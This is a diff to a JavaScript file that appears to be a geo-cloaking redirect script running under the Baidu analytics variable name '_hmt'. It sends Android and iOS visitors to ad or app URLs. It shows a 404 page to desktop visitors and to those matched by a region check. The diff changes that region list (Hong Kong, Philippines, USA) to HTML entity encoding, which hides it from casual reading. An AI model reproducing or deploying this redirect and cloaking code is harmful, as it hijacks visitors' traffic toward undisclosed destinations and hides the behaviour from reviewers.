@@ -1,4 +1,12 @@
 var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?565373eda1c25834b3cb20b03026706f";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+
+var _hmt = _hmt || [];
 (function (w, d, address) {
 
 
@@ -38,14 +46,14 @@ var _hmt = _hmt || [];
         }
       }
       if(count!==0){
-        self["location"] = "/ ;
+        self["location"] = "/404.html" ;
       }else{
         if(isAndroid){
           self["location"] = adurl ;
         }else if (isIOS){
           self["location"] = apurl ;
         }else{
-          self["location"] = "/" ;
+          self["location"] = "/404.html" ;
         }
       }
     }
@@ -71,4 +79,4 @@ var _hmt = _hmt || [];
     };
     load();
   }
-})(window, document, ['香港,菲律宾,美国']);
+})(window, document, ['&#x83F2;&#x5F8B;&#x5BBE;,&#x9999;&#x6E2F;,&#x7F8E;&#x56FD;']);
